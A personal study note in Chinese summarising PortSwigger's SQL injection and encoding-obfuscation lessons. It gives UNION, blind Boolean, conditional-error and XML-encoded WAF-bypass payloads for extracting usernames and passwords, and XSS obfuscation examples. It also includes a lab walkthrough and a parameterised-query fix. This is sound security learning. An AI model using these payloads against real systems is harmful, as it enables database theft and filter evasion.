# 2023-05-17：筆記 PortSwigger 的 SQL injection.md

Ref:
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet


`Gifts'--`: `--` 是 sql 的註解。這個寫法有機會讓後面的查詢句變成註解
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- 這樣就把 AND release 給跳過了
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
  
`Gifts'+OR+1=1--`: 多加一個 `OR+1=1`，可以另外把其他資料挖出來

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

修改後的查詢將返回類別為 Gifts 或 1 等於 1 的所有項目。因為 1=1 始終為真，查詢將返回所有項目  

假如有個 User 登入的 sql 是這樣，那我們也可以用同樣的方法繞過去
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

同樣的方法，加上 `UNION`，我們就能挖到其他 欄位 or table 的資料  
- `' UNION SELECT username, password FROM users--`

```sql
SELECT name, description FROM products WHERE category = 'Gifts'

SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users --'

```

有這些方法後，有時還可以想辦法辨別是哪一種 db  
下面這語法，如果ＯＫ的話，代表是 oracle db  
```sql
SELECT * FROM v$version
```  

還可以確定存在哪些 db table，以及它們包含哪些列。 在大多數 db 上，可以執行以下查詢來列出表：
```sql
SELECT * FROM information_schema.tables
```



## Blind SQL injection
- 許多 SQL injection 的實例都是 Blind 漏洞
- 這意味 App 不會在其 response 中 return  SQL 查詢的結果或任何 db 錯誤的詳細資訊
- Blind vulnerabilities 仍然可以被利用來訪問未經授權的 data，但技術通常更加複雜且難以執行

根據漏洞的性質和涉及的 db，可以使用以下技術來利用 Blind SQL injection：
- 可以更改查詢的邏輯，以根據單個條件的真實性觸發 app response 中可檢測到的差異
  - 這可能涉及將新條件注入某些 Boolean 邏輯，或有條件地觸發錯誤，例如被零除 (divide-by-zero)
  - https://github.com/Yinzo/SQL-Injection-Cheat-Sheet-Chinese-Ver./blob/master/article.md
- 可以有條件地觸發查詢處理中的時間延遲，從而允許根據 app response 所需的時間來推斷條件的真實性
- 觸發帶外部網路交互 [OAST](https://portswigger.net/burp/application-security-testing/oast)
  - 這種技術非常強大，可以在其他技術無法發揮作用的情況下發揮作用
  - 通常，可以通過帶外通道直接洩露 data，例如將 data 放入您控制的 domain 的 DNS 查找中


## 如何檢測 SQL injection 漏洞
- Burp Suite 的 [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner) 可以掃出來

手動測 SQL injection：
- submit 單引號 `'` 並尋找錯誤或其他異常情況
- submit 些 SQL 特定的語法，對入口點的基本（原始）值和不同的值進行評估，並尋找 app response 的系統差異
- submit boolean，如 `OR 1=1` 和 `OR 1=2`，並尋找 app response 中的差異
- submit 在 SQL 查詢中執行時觸發 time delays 的 payloads，並尋找 response time 的差異
- 當在 SQL 查詢中執行時，submit 觸發帶外部網路互動的 OAST payload，並監測任何結果的互動


在查詢的不同部分進行 SQL injection
- 大多數 SQL injection 出現在 `SELECT` 的 `WHERE` 中
- 這種類型的 SQL injection 一般被有經驗的測試人員所理解

但是 SQL injection 原則上可以發生在查詢的任何位置，以及不同的查詢類型中。最常見的其他產生 SQL injection 的位置是：
- `UPDATE` 中，在 `updated values` 或 `WHERE` 子句中(clause)
- `INSERT` 中，在 `inserted values` 中
- `SELECT` 中，在 `table or column name` 中
- `SELECT`中，在 `ORDER BY` 子句中


不同背景下的 SQL injection  
在到目前為止中，你已經使用查詢字串來 inject 惡意 SQL paylaod  
- 然而，重要的是要注意，你可以使用任何可控制的輸入來執行 SQL injection
- 這些輸入被 application 為 SQL query 來處理
- 例如，一些網站採取 JSON 或 XML 格式的輸入，並用它來查詢 DB

這些不同的格式甚至可以為你提供其他的方式來 [obfuscate attacks(混淆攻擊)](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- 否則會因為 WAF 和其他防禦機製而被阻止
- 通過關鍵字編碼或轉義來繞過這些過濾器

例如，以下基於 XML 的 SQL injection 使用 `XML escape sequence` 來 encode `SELECT` 中的 `S` 字：
- 這將在傳遞給 SQL 之前被 server side 解碼

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```


`web 應用程序防火牆` (WAF) 將
- 會阻止明顯的 SSQL injection 的請求
- 你需要方法來混淆(obfuscate)惡意查詢以繞過此過濾器
- burp 有 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension 有幫助
 
 
`Second order SQL injection`:
- `First order SQL injection` 是指 App 從 HTTP request 中獲取使用者的輸入，並在處理該 request 的過程中，以不安全的方式將該輸入納入 SQL 查詢


- `Second order SQL injection` (也稱為 `stored SQL injection`)
- App 從 HTTP request 中獲取使用者的輸入，並將其存儲起來供將來使用
- 這通常是通過將輸入的 data 放入 db 來完成的，但在 data 被存儲的地方並沒有出現漏洞。之後，當處理不同 HTTP request 時，App 搜尋儲存的 data 並以不安全的方式將其納入 SQL 查詢
- 經常出現在開發人員意識到有 SQL injection vulnerabilities 的情況下
  - 因此安全地處理輸入到 db 的初始位置。當 data 後來被處理時，它被認為是安全的，因為它之前被安全地放入了 db
    - 在這一點上，data 被以不安全的方式處理，因為開發者錯誤地認為它是可信的



DB 的特定因素
- DB 間也有許多差異。意味著一些檢測(detecting and exploiting) SQL injection 的技術在不同的平台上有不同的作用

比如說：
- Syntax for string concatenation (字串連接的語法)
- 註解
- Batched (or stacked) queries
- DB 特定的 API
- Error messages


如何防止 SQL injection
- 大多數 injection 的情況可以通過使用參數化查詢（也稱為 `prepared statements`）來防止，而不是在查詢中使用字串連接


下面的 code 容易受到 SQL injection 的影響，因為 User 輸入的內容直接串聯到查詢中：
```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```


這段 code 可以很容易地重寫，以防止 User 輸入干擾查詢結構：
```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

參數化查詢可以用於任何不受信任的輸入作為 data 出現在查詢中的情況
- 包括 WHERE 子句和 INSERT 或 UPDATE 語句中的值。它們不能用於處理查詢中其他部分的不可信任的輸入
  - 如 table or column names, or the ORDER BY clause
- 將不可信任的 data 放入查詢的這些部分的 app 將需要採取不同的方法
  - 例如將允許的輸入值列入白名單，或使用不同的邏輯來提供所需的行為


為了使參數化查詢能夠有效地防止 SQL injection
- 查詢中使用的字串必須始終是 hard code 的 constant
- 並且決不能包含來自任何來源的任何變數 data
- 不要試圖逐個決定某 data 是否值得信任，並繼續在查詢中使用字串連接，以應對被認為安全的情況
- 對於 data 的可能來源，或者對於其他 code 的變化，很容易犯錯誤，從而違反關於什麼 data 被污染的假設


Lab: SQL injection with filter bypass via XML encoding
- https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
- 這題沒我想像的簡單，好好看一次解答。重點是解答有思路  

第一步，識別 vulnerability
1. 觀察到 stock check feature 以 XML 格式向 app 發送 productId 和 storeId
2. 向 `Burp Repeater` 送 POST`/product/stock` request
3. 在 `Burp Repeater`中，測試 `storeId`，看看你的輸入是否被 evaluated
    - 例如，嘗試用數學表達式替換 ID，以評估為其他潛在的 ID
    - `<storeId>1+1</storeId>`。
4. 觀察你的輸入似乎被 app **evaluated** 了，返回不同商店的庫存
5. 試著確定原始查詢返回的列數，在原始商店ID上附加一個 UNION SELECT 語句：
    - `<storeId>1 UNION SELECT NULL</storeId>`。
    - 觀察到你的 request 由於被標記為潛在攻擊而被阻止



第二步 Bypass the WAF:
1. As you're injecting into XML, try obfuscating your payload using [XML entities](https://portswigger.net/web-security/xxe/xml-entities). One way to do this is using the [Hackvertor extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100). Just highlight your input, right-click, then select `Extensions > Hackvertor > Encode > dec_entities/hex_entities`.
2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

繞過WAF：
1. 由於你正在 injecting XML，嘗試使用 [XML entities](https://portswigger.net/web-security/xxe/xml-entities) 混淆你的 payload
    - 一種方法是用 [Hackvertor extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
    - 只需要 highlight your input, right-click, then select `Extensions > Hackvertor > Encode > dec_entities/hex_entities`
2. 重新發送請求，注意你現在從 app 中收到正常的 response。這表示已經成功繞過了 WAF



第三部 編制漏洞
1. 繼續你的工作，並推斷出查詢只返回一個列。當你試圖返回一個以上的列時，app 返回 `0 units`，意味著一個錯誤。
2. 由於你只能返回一列，你需要將返回的 username 和密碼串聯起來，例如：
    - `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`。
3. 發送這個查詢，並觀察到你已經成功地從 db 中獲取了 username 和密碼，用 `~` 分開
4. 用帳號密碼就能登入了，過關

```
carlos~fwna6oey08m41omrw97x
administrator~hoa4uxh2uemb15t0aw08
352 units
wiener~kwxpu15ucyib1dr9ahav
```



------------------

## 特定情境的 decoding
client side 和 server side 都使用各種不同的 encode 在系統之間傳遞 data
- 當它們想實際使用 data 時，必須先對其進行 decode
- decode 步驟的確切順序取決於 data 出現的環境
- 例如，查詢參數通常是在 server side 端進行 URL decode
- HTML element 的 content 可能是在 client side 進行 HTML decode

當構建攻擊時
- 要考慮 payload 究竟被 inject 到哪裡
- 如果能根據這種情況推斷出 input 是如何被 decode 的，你就有可能找出表示相同 payload 的其他方法


------------------



## 通過 URL encode 進行混淆
URL 中的保留字符具有特殊意義
- 例如，安培號（`&`）被用作分隔查詢字串中的參數的分隔符
- 如果 user 搜尋 `Fish & Chips`，會發生什麼？

browser 會自動對任何可能引起解析器歧義的字進行 URL encode
- 用 `%` 和其2位數的十六進制 code 代替它們
- 空格可以被 encode 為 `%20`，但它經常被 `+` 所代替

```
[...]/?search=Fish+%26+Chips
```


任何基於 URL 的輸入都會在 server side 自動進行 URL decode
- 就大多數 server side 而言，查詢參數中的 `%22`, `%3C`, `%3E` 等序列分別與 `"`, `<`, `>` 字同義
- 你可以通過 URL inject URL encoded 的 data，它仍會被後 backend 正確解讀


偶爾
- 可能 WAF 和類似的東西在檢查你的輸入時不能正確地進行 URL decode
- 在這種情況下，你可能只需對被列入黑名單的任何字或詞語進行 encode，就能將 payload 偷渡
- 例如，在 SQL inject 中，可能對關鍵字進行 encode，因此 SELECT 變成`%53%45%4C%45%43%54`

------------------

## 通過雙重 URL encoding 進行混淆
出於一些原因，有些 server side 對它們收到的任何 URL 進行兩輪 decode
- 這本身並不一定是個問題，只要任何安全機制在檢查輸入時也進行雙重 decode
- 否則，這種差異使攻擊者能夠通過簡單的兩次 encode 將惡意輸入偷渡到後端


假設你試圖 inject 一個標準的 XSS Po
- 如 `<img src=x onerror=alert(1)>`
- 在這種情況下，URL 可能看起來像這樣

```
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```


當檢查 request 時
- 如果 WAF 執行標準的 URL decode，它將很容易識別這個 payload。這 request 無法到達 backend
- 但如果你 double-encode  呢？這意味著 `%` 字本身會被替換成 `%25`


```
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

由於 WAF 只 decode 一次
- 它可能無法識別該 request 是危險的
- 如果 backend serever 隨後對這個輸入進行 double decode，payload 將被成功 inject

-------------------

## 通過 HTML encoding 進行混淆
在 HTML 中，某些字需要被轉義或編碼，以防止 browser 將其錯誤地解釋為 markup 的一部分
- 這可以用引用來代替違規的字來實現，引用的前綴是 ampersand (`&`)，結尾是分號
- 在許多情況下，可以使用名稱作為參考。例如，sequence `&colon;`代表冒號
- 另外，也可以使用字的十進製或十六進制，在這種情況下，分別是 `&#58;` 和 `&#x3a;`


在 HTML 中的特定位置
- 如一個 element 的 content 或 attribute 的值，browser 將在解析時自動 decode 這些
- 當在這樣的位置內 inject 時，你爾可以利用這點來混淆 client side 攻擊的 payload
  - 將其隱藏在任何已到位的 server side 的防禦措施中

仔細看前面的例子中的 XSS payload
- 注意到 payload 被 inject 到 HTML attribute 中
- 如果 server 檢查是明確地尋找 `alert()` payload，如果你對一個或多個字進行 HTML encode，他們可能不會發現這一點

```html
<img src=x onerror="&#x61;lert(1)">
```

browser renders 時，就會 decode 然後執行 injected payload


-------------------

## Leading zeros (前導零)
有趣的是
- 當使用十進製或十六進制的 HTML encode 時，可以選擇在 code 中包含任意數量的 leading zeros
- 一些 WAFs 和輸入過濾器未能充分考慮到這一點
- 如果你的 payload 在進行 HTML encode 後仍被 block，可以加上幾個零試試看

```html
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

-------------------

## 通過 XML encoding 進行混淆
XML 與 HTML 密切相關
- 也支持使用相同的數字轉義序列進行 character encoding
- 這能夠在不破壞語法的情況下，在元素的內容中包含特殊字符
- 例如，在通過基於 XML 的輸入測試 XSS 時，這就很方便了

即使你不需要對任何特殊字符進行編碼以避免語法錯誤
- 也有可能利用這種行為來混淆 payload
- payload 是由 server 本身 decode 的，而不是由 browser 在 client side decode
- 這對繞過 WAFs 和其他過濾器很有用，如果它們檢測到與 SQL injection 相關的某些關鍵詞，可能會阻止 request


```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

-------------------
 
## 通過 unicode escaping 進行模糊
Unicode escape sequences 由前綴 `\u` 和四位數十六進制 code 組成
- 例如，`\u003a` 代表冒號
- ES6 還支持使用大括號的新形式的 Unicode 轉義：`\u{3a}`

```js
unescape('\u003a') // ':'
unescape('\u{3a}') // ':'
```


解析字串時
- 大多程語言都會對這些 unicode 轉義進行 decode，包括 browser
- Inject 時，可以 用unicode 混淆 client side 的 payload



例如，假設你試圖利用 [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- 你的輸入是以字串的形式傳遞給 `eval()`
- 如果被阻止了，可以嘗試對其中的一個字進行轉義

如：
```js
eval("\u0061lert(1)")
```



由於這將保持 server side 的 enconde
- 它可能不會被發現，直到 browser 再次 decode 它

在一個字串中
- 你可以轉義任何像這樣的字
- 但在字串之外，轉義某些字會導致語法錯誤。例如，opening and closing parentheses


還值得注意的是
- ES6 風格的 unicode 轉義也允許 optional leading zeros
- 所以一些 WAF 可能很容易用 HTML enconde 的相同技術被騙

比如：
```html
<a href="javascript\u{0000000003a}alert(1)">Click me</a>
```

-------------------

## hex escaping 進行混淆
另一個選擇是使用十六進制轉義
- 用十六進制代碼點來表示字，前綴為 `\x`。如，`\x61` 表示小寫 `a`
- 就像 unicode 轉義一樣，只要輸入被認為為一個字串，這些轉義就會在 client side 被 decode

```js
eval("\x61lert")
```

有時也可以用類似的方式，用前綴 `0x` 來混淆 SQL
- 如，`0x53454c454354`可以被解碼成 `SELECT`


-------------------

## octal escaping 進行混淆
Octal escaping 跟 hex escaping 工作方式基本相同
- 只是字參考使用的是 8 進制的編號系統
- 這些字符前綴是獨立的反斜線，`\141` 表示小寫 `a`

```js
eval("\141lert(1)")
```


-------------------

## 通過多種 encoding 進行混淆

值得注意的是
- 你可以 combine encodings
- 將 payload 隱藏在多層混淆的後面

看看下面這個例子中的 javascript URL：
```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```
 
首先
- browser 會對 `&bsol;` 進行 HTML decode，結果是個反斜線 `\`
- 這樣做的效果是將原本 `u0061` 字變成了 unicode 轉義 `\u0061`

```html
<a href="javascript:\u0061lert(1)">Click me</a>
```


然後進一步 decode，形成 有效的 XSS payload:
 

```html
<a href="javascript:alert(1)">Click me</a>
```


要成功地以這方式 inject payload
- 你需要對輸入的 decode/encode 的順序有充分的了解

-------------------



## 用 SQL `CHAR()` function 來 Obfuscation
嚴格來說，這不算一種 encode
- 你可以通過 `CHAR()` function 來混淆 SQL injection
- function 接受單一的十進製或十六進制 code 並返回匹配的字
  - 十六進制以 `0x` 為前綴。如，`CHAR(83)`和 `CHAR(0x53)` 都返回大寫字母 `S`

用這種方法來混淆的關鍵字。即使 `SELECT` 被列入黑名單，可以這樣做
- 當 App 將此作為 SQL 處理時，它將動態地構建 SELECT 關鍵字並執行查詢
```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```



---------------

## 在 SQL inject 攻擊中檢查 DB
在利用 SQL inject 時，通常需要收集 DB 本身的資訊。包括 DB 類型和版本，以及 DB 內容，即它包含哪些 table 和 column

---------------


## 查詢 DB 的類型和版本
不同的 DB 提供了查詢其版本的不同方法
- 通常需要嘗試不同的查詢方式來找到有效的方式

對於一些流行的 db，查詢方法如下：

| Database | type	Query |
| :--- | :--- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |


Use a `UNION attack` with the following input:

```
' UNION SELECT @@version--
```

這可能會返回類似以下的輸出
- 確認 DB 是 Microsoft SQL Server，以及版本

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

Oracle  版本要用 banner 才能撈到資料
```
' UNION SELECT BANNER,NULL FROM v$version--
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```


Microsoft, MySQL: 在 URL 的時候 `--` 這個註解空白會被吃掉
```
' UNION SELECT @@version, NULL -- #
```

`DUAL` 空表 (Oracle,MSSQL,MYSQL)
```
select * from DUAL
```
Oracle 必須要

----------

## 列出 DB 的內容
大多數 DB (Oracle 除外) 都有 information schema，提供關於 DB 的資訊
- 查詢 `information_schema.tables` 來列出 DB 中的 table 

```sql
SELECT * FROM information_schema.tables
```

結果

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```


結果表示有三個 table，Products, Users, and Feedback
- 然後我們可以查詢 `information_schema.columns` 來列出各個 table 中的 columns：

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

結果:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```




----------


## 在 Oracle 上查 information schema
在 Oracle，你可以通過查詢 `all_tables` 來列出 table

```sql
SELECT * FROM all_tables
```

用 `all_tab_columns` 來 list columns:

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

------------------
 
##  UNION SQL injection 攻擊

`UNION` 多執行額外的 `SELECT`，並將結果附加到原始查詢中  

這個 SQL 將返回一個有兩列的 single result set，包含
- `table1` 中的 `a` 和 `b` 列
- `table2` 中的 `c` 和 `d` 列的值

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```


要使 UNION query 發揮作用，必須滿足兩個關鍵要求：
- **各個查詢必須返回相同數量的 columns**
- **每一列(columns)的「資料型態」在各個查詢之間必須是兼容的**


要進行 UNION SQL injection 攻擊，你需要確保滿足這兩個要求。這通常涉及到弄清楚：
- **從原始查詢中返回的列(columns)有多少？**
- **從原始查詢中返回的哪些列具有合適的「資料型態」，可以容納注入查詢的結果？**

-------------

## Determining the number of columns required in a SQL injection UNION attack
When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

## 確定在 UNION SQL injection 攻擊中需要的列數
在進行 UNION SQL injection 攻擊時，有兩種有效的方法來確定從原始查詢中返回多少列(columns)


第一種方法
- Inject 一系列的 `ORDER BY` 子句，並遞增指定的列索引，直到發生錯誤
- 例如，假設 inject 的點是原始查詢的 WHERE 子句中的一個帶引號的字串，你將送出：

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

這系列 payload 修改了原始查詢，以按結果集中的不同列對結果進行排序
- ORDER BY 中的列可以通過 index 指定，所以不需要知道任何列的名稱
- 當 index 超過結果 set 的實際列數時， DB 會報錯，如：

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

App
- 可能在 HTTP response 中返回 DB error
- 也可能返回一個通用 error，或者乾脆不返回結果
- 只要你能在 App 的 response 中發現一些差異，就可以推斷出從查詢中返回多少列


第二種方法是
- Submit 一系列的 `UNION SELECT payload`，指定不同數量的 `null`：

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

如果 `null` 的數量與列的數量不匹配，db 會返回 error，如：

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```


同樣，App
- 可能真的會返回這個 error message
- 也可能只是返回一般的 error 或沒有結果
- 當 `null` 的數量與列的數量相匹配時，db 會在結果 set 中返回一個額外的行，其中每一列都包含 `null` 值
- 對結果的 HTTP response 的影響取決於 App 的寫法
- 如果幸運，你會在 response 看到額外的內容
  - 例如 HTML table 上的額外行
  - 否則，`null `可能會觸發一個不同的錯誤，如`NullPointerException`
  - 最壞的情況是，response 可能沒有區別，使得這種確定列數的方法無效


注意
- 用 `NULL` 作為 injected SELECT 的返回值的原因是
  - 每一列的「資料型態」必須在原始查詢和 inject 的查詢之間兼容
  - `NULL` 可以轉換為每個常用的「資料型態」，使 `NULL` 可以最大限度地提高當列數正確時 payload 的成功率
- Oracle 每個 `SELECT` 查詢必須使用 `FROM` 關鍵字並指定有效的 table
  - 在 Oracle 有個內建的 table 的表叫 `dual`，可以用於這個目的
  - 因此，在 Oracle 上 inject 的查詢需要看起來像：
    - `' union select null from dual--`
- Payload 使用雙破折號註釋序列 `--` 來註釋注入點之後原始查詢的剩餘部分
  - **在 MySQL 中，`--` 後面必須有一個空格，或者，可以使用散列字符 `#` 來識別註釋**
- 關於 DB 特定語法的更多細節，參閱[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-----------------

 
## 在 UNION SQL injection 攻擊中尋找具有有用「資料型態」的列
執行 UNION SQL injection 攻擊是為了能夠從 injection 的查詢中搜尋到結果
- 一般來說，你想搜尋的有趣的 data 將是字串形式
- 所以你需要在原始查詢結果中找到一個或多個「資料型態」為字串 data 或與之兼容的列


在確定了所需列的數量後
- 你可以通過一系列 `UNION SELECT payload`，將一個字串值依次放入每一列
- 探測每一列，以測試它是否可以容納字串 data。例如，如果查詢返回四列，你將 submit ：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果一個列的「資料型態」與字串不兼容，查詢將導致 db error，如：
- 如果沒有 error，並且 App response 包含一些額外的內容，包括 inject 的字串值，那麼相關的列適合搜尋字串 data
```
Conversion failed when converting the varchar value 'a' to data type int.
```




----------------


## 用 UNION SQL injection 攻擊來搜尋有趣的 data
當確定了原始查詢返回的列數，並發現哪些列可以容納字串時，你就可以搜尋到有趣的資料了

假設
- 原始查詢返回兩列，這兩列都可以容納字串資料
- 注入點是 WHERE 子句中的一個引號字串
- 資料庫包含一個叫做 `users` 的 table，有 `username` 和 `password` 兩列


在這種情況下，你可以通過 submit 輸入來搜尋 users table 的內容：


```
' UNION SELECT username, password FROM users--
```


當然，進行這攻擊所需要的關鍵資訊是
- 有個叫做 `users` 的 table，有兩列叫做 `username`,`password`
- 如果沒有這些資訊，你就只能試圖猜測表和列的名稱
- 事實上，所有現代 db 都提供了檢查結構的方法，以確定它包含哪些表和列

-----------------------


## 搜尋單一列中的多個值
在前面的例子中，假設查詢只返回一個單列
- 你可以很容易地在這一單列中搜尋多個值，方法是將這些值連接在一起
- 最好包括合適的分隔符，以便區分這些組合的值。如，在 `Oracle` 你可以 submit 這樣的輸入：

```
' UNION SELECT username || '~' || password FROM users--
```

使用 `||`，這是 Oracle 上的字串連接
- Injected query 將 username 和 password 字的值連接在一起，用 `~` 分開

查詢的結果將讓你讀取所有的 username 和 password，如：

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```


不同的 DB 使用不同的語法來執行字串連接。更多請參閱
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


-------------------

## 什麼是  blind SQL injection ?
是指 App 受到 SQL injection 攻擊，但其 HTTP response 不包含相關的 SQL 查詢結果或任何 DB error 的細節

許多技術，如 UNION 攻擊，都是無效的，因為依賴於能夠在 App 的 response 中看到 injection 的查詢結果
- 利用 blind SQL injection 來訪問未經授權的 data 仍然是可能的，但必須使用不同的技術

-------------------




## 利用 blind SQL injection 來觸發 conditional responses
考慮一個使用 cookie 來跟踪收集使用分析的 App
- 對該 App 的 request 包括cookie header，就會像這樣
 
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```


當包含 TrackingId cookie 的 request 被處理時
- App 使用類似這樣的 SQL 查詢來確定這是否是一位已知的使用者

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```


這個查詢容易受到 SQL injection 影響
- 但查詢的結果不會返回給 User
- 然而，App 的行為是不同的，這取決於查詢是否返回任何 data
- 如果它返回 data（因為 submit 了一個 `TrackingId`），那頁面中就會顯示 `Welcome back` 的資訊

**這種行為足以能夠利用 blind SQL injection 漏洞**
- 並根據 injection 的條件，通過觸發不同的 response 來獲取資訊
- 為了看清這一點，假設有兩個 request 被發送，其中依次包含了以下的 `TrackingId` cookie

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
 
第一個值將導致查詢返回結果
- 因為 `AND '1 ='1'` 為 `true`，所以將顯示 `Welcome back` 的資訊

第二個值將導致查詢**不返回任何結果**
- Injection 的條件是 `false` 的，所以不會顯示 `Welcome back`

**這使我們能夠確定能夠執行 `any single injected condition`**
- 因此可以一次提取一點資料

假設有個名為 `Users` 的 table
- 有 `Username`, `Password` 兩列
- 還有個名為 `Administrator` 的 user


可以通過發送一系列的輸入來系統地確定這個 user 的密碼，一次一個字的測試這個密碼  
- 要做到這一點，我們從下面的輸入開始：

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```


這會返回 `"Welcome back"`
- 表示 injected condition 為 `true`，因此密碼的第一個字大於 `m`

接下來輸入：

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

這沒有返回 `"Welcome back"`
- 表示 injected condition 為 `false`，所以密碼的第一個字不大於 `t`

最終，我們輸入，返回 `"Welcome back"`，從而確認密碼的第一個字是`s`

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```


繼續這個過程，一步步確定 `Administrator` 的完整密碼!!

注意
- `SUBSTRING` function 在某些 DB 中被稱為 `SUBSTR`
- For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-------------------

## Error-based 的 SQL injection
Error-based 的 SQL injection 是利用 error message 從 DB 中提取或推斷敏感資料的情況，甚至在 blind 的情況下
- 這種可能性主要取決於 db 的 config 和你能夠觸發的「錯誤類型」
- 你可能能夠誘導 App 根據 boolean 表達式的結果返回特定的 error response
- 可以用上面看到的 conditional responses 方式來利用這一點
- 你可能能夠觸發 error message，輸出查詢返回的資料。這可以有效地將原本 blind 變成 visible 的

-------------------

## 觸發 conditional errors 來利用 blind SQL injection
在前面的例子，假設 App 執行相同的 SQL，但不會因為查詢是否返回任何資料而有任何不同的行為
- 前面的技術將不起作用，因為 injection 不同的 boolean 條件對 App 的 response 沒有任何區別

在這種情況下
- 通常可以根據 injected condition，通過有條件地觸發 SQL error 來誘導 App 返回 conditional responses
- 這涉及到修改查詢，使其在條件為 `true` 時引起 db error，而在條件為 `false` 時則不會
- 很多時候，db 拋出的未處理的 error 會在 App response 中引起差異（如 error message），使我們能夠推斷出 injected condition 的真實性


假設有兩個 request，其中依次包含以下 TrackingId cookie:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```


使用 `CASE` 關鍵字來測試一個條件
- 根據表達式是否為 `ture` 返回一個不同的表達式
- 第一個輸入，`CASE` 表達式評估為 `'a'`，這不會引起任何錯誤
- 第二個輸入，是 `1/0`，這將導致 `divide-by-zero error`
  - 假設這個錯誤導致 App 的 HTTP response 出現一些差異，我們可以利用這個差異來推斷 injected condition 是否為 `true`

這種技術，我們可以用已經描述過的方式來檢索資料，一次系統地測試一個字：
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

觸發 `conditional errors` 的方法有很多
- 不同的技術對不同的 DB 效果最好
- 參考 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-------------------

## 從 verbose SQL error messages 找出敏感資料

DB 錯誤的 config 有時會導致出現 verbose error message
- 這些資訊提供對攻擊者有用的資訊
- 如，以下錯誤資訊，它發生在向 `id` inject 單引號(`'`)之後

```
